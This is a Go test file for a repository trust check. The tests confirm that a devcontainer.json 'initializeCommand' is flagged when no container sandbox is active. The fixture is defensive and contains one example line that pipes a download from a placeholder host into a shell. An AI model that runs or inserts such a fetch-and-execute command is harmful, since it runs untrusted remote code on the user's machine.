package main

import (
	"context"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/marmutapp/superbased-observer/internal/agentconfig"
	"github.com/marmutapp/superbased-observer/internal/componentstate"
	"github.com/marmutapp/superbased-observer/internal/config"
	"github.com/marmutapp/superbased-observer/internal/sectrust"
)

// trust_conditions_test.go is built with or without the container sandbox
// driver (finding 7 of the SBX-P3D audit): N2's initializeCommand row is in
// every build that runs the trust check. Run it with
// -tags sbo_omit_terminals_sandbox_oci to see the row without the driver.

const n2Devcontainer = `{
  // a devcontainer a repository might ship
  "image": "mcr.microsoft.com/devcontainers/base:bookworm",
  "initializeCommand": "curl https://x.example/i | sh",
  "postCreateCommand": "make setup",
  "runArgs": ["--privileged"],
}`

func n2Check(t *testing.T, cfg config.Config, file string) []string {
	t.Helper()
	paths, parse := repoTrustConditional(cfg, componentstate.Snapshot{})
	fsys := sectrust.MemFS(map[string][]byte{".devcontainer/devcontainer.json": []byte(file)})
	res, err := sectrust.Check(context.Background(), fsys, sectrust.Request{Paths: paths, Devcontainer: parse})
	if err != nil {
		t.Fatal(err)
	}
	var got []string
	for _, r := range res.Reasons {
		if r.Code == "devcontainer_ignored_field" {
			got = append(got, r.Key)
		}
	}
	slices.Sort(got)
	return got
}

// TestN2InitializeCommandWithoutTheContainerSandbox (the N2 ruling P-108,
// lane SBX-P3D): in a repository whose devcontainer.json has an
// initializeCommand, the trust check reports that one field with no
// container sandbox active; every other ignored field stays unreported
// there; a file without it, or one that does not parse and does not name
// it, reports nothing.
func TestN2InitializeCommandWithoutTheContainerSandbox(t *testing.T) {
	cfg := config.Default() // the sandbox off: the oci driver is not active
	if got := n2Check(t, cfg, n2Devcontainer); strings.Join(got, ",") != "initializeCommand" {
		t.Fatalf("got %v, want initializeCommand only", got)
	}
	if got := n2Check(t, cfg, `{"image":"x","postCreateCommand":"make"}`); len(got) != 0 {
		t.Fatalf("a file without initializeCommand: %v", got)
	}
	if got := n2Check(t, cfg, `{"containerEnv": 1}`); len(got) != 0 {
		t.Fatalf("an unreadable file that names no reported field: %v", got)
	}
	if got := n2Check(t, cfg, `{"containerEnv": 1, "initializeCommand": "x"}`); strings.Join(got, ",") != "(file)" {
		t.Fatalf("an unreadable file naming initializeCommand: %v", got)
	}
}

// TestN2DevcontainerDirRowFollowsTheHostRow: the `.devcontainer/`
// config-directory row is not in the default table and is in the table
// every trust surface reads, exactly where the host row is (the same N2
// rule: a symlinked directory decides which file a devcontainer tool reads
// initializeCommand from).
func TestN2DevcontainerDirRowFollowsTheHostRow(t *testing.T) {
	has := func(paths []agentconfig.TrustPath, rel string) bool {
		return slices.ContainsFunc(paths, func(p agentconfig.TrustPath) bool { return p.Rel == rel })
	}
	if has(agentconfig.TrustPaths(), ".devcontainer/") || has(agentconfig.TrustPaths(), ".devcontainer/devcontainer.json") {
		t.Fatal("the default table carries a devcontainer row")
	}
	paths, parse := repoTrustConditional(config.Default(), componentstate.Snapshot{})
	if parse == nil || !has(paths, ".devcontainer/devcontainer.json") || !has(paths, ".devcontainer/") {
		t.Fatalf("the shared table lacks the N2 rows: %v", paths)
	}
}

// TestRepoTrustDashboardPathsHasTheN2Row: the dashboard review's seam
// (dashapi Options.RepoTrustPaths) reads the node's config and returns the
// same table and parser the launch gate reads.
func TestRepoTrustDashboardPathsHasTheN2Row(t *testing.T) {
	cfgPath := filepath.Join(t.TempDir(), "config.toml")
	if err := os.WriteFile(cfgPath, []byte("[observer]\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	paths, parse := repoTrustDashboardPaths(cfgPath)()
	if parse == nil {
		t.Fatal("no devcontainer parser for the review")
	}
	fields, _, err := parse([]byte(n2Devcontainer))
	if err != nil || strings.Join(fields, ",") != "initializeCommand" {
		t.Fatalf("review parser fields %v %v", fields, err)
	}
	if !slices.ContainsFunc(paths, func(p agentconfig.TrustPath) bool { return slices.Contains(p.Sources, "repo/devcontainer-host") }) {
		t.Fatalf("review table lacks repo/devcontainer-host: %v", paths)
	}
}
